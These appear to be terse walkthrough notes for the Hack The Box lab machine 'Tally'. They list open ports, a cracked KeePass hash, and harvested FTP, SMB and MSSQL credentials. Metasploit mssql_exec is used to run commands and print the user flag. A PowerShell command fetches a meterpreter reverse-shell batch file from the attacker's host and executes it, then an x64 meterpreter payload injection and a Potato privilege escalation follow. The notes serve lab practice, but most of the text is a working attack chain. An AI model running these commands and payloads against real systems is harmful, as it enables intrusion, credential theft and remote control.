PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
81/tcp    open  hosts2-ns
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
808/tcp   open  ccproxy-http
1433/tcp  open  ms-sql-s
5985/tcp  open  wsman
15567/tcp open  unknown
32843/tcp open  unknown
32844/tcp open  unknown
32846/tcp open  unknown
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown




=> http://github.com/sensepost/SPartan
	pip install requests_ntlm
	python SPartan.py -u http://tally.htb -sfcv

=> http://tally.htb/Shared%20Documents/Forms/AllItems.aspx

FTP details
hostname: tally
workgroup: htb.local
password: UTDRSCH53c"$6hys
Please create your own user folder upon logging in

	ftp_user
	UTDRSCH53c"$6hys

=> Tim has keepass file 
$keepass$*2*6000*222*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb*3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea*3f759d7011f43b30679a5ac650991caa*b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192*535a85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da
CRACKED: simplementeyo

=> KEEPASS DATA:
TALLY ACCT share : Finance : Acc0unting
CISCO : cisco : cisco123
PDF Writer : 64257-56525-54257-54734 : 


=> SMB SHARE:
smbclient -L tally.htb -U Finance
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\Finance's password: 
Domain=[TALLY] OS=[Windows Server 2016 Standard 14393] Server=[Windows Server 2016 Standard 6.3]

	Sharename       Type      Comment
	---------       ----      -------
	ACCT            Disk      
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
Connection to tally.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
NetBIOS over TCP disabled -- no workgroup available


=> MOUNTING THE ACCT: mount -t cifs -o username=Finance,password=Acc0unting //10.10.10.59/ACCT /mnt
Strings zz_Migration\Binaries\New folder\tester.exe
DRIVER={SQL Server};SERVER=TALLY, 1433;DATABASE=orcharddb;UID=sa;PWD=GWE3V65#6KFH93@4GWTG2G;

=>  use auxiliary/admin/mssql/mssql_exec
Module options (auxiliary/admin/mssql/mssql_exec):

   Name                 Current Setting                                  Required  Description
   ----                 ---------------                                  --------  -----------
   CMD                  cmd.exe /c type C:\Users\Sarah\Desktop\user.txt  no        Command to execute
   PASSWORD             GWE3V65#6KFH93@4GWTG2G                           no        The password for the specified username
   RHOST                10.10.10.59                                      yes       The target address
   RPORT                1433                                             yes       The target port (TCP)
   TDSENCRYPTION        false                                            yes       Use TLS/SSL for TDS data "Force Encryption"
   USERNAME             sa                                               no        The username to authenticate as
   USE_WINDOWS_AUTHENT  false                                            yes       Use windows authentification (requires DOMAIN option set)

user.txt
be72362e8dffeca2b42406d5d1c74bb1


=> SHELL:
Use veil (22) powershell meterpreter reverse tcp
Get code in Tally1.bat
Start Listner

use auxiliary/admin/mssql/mssql_exec
PASSWORD             GWE3V65#6KFH93@4GWTG2G 
RHOST                10.10.10.59

set CMD powershell.exe /c Invoke-WebRequest -Uri 10.10.14.198/Tally1.bat -OutFile C:\\Users\\Sarah\\rev.bat
run
set CMD cmd.exe /c C:\\Users\\Sarah\\rev.bat
run

=> upgrade to x64
use windows/local/payload_inject 
set payload windows/x64/meterpreter/reverse_tcp

=> Root Potato Doh!


![Alt test](https://media.giphy.com/media/hKNPxrffFH0GY/giphy.gif "Suuure")
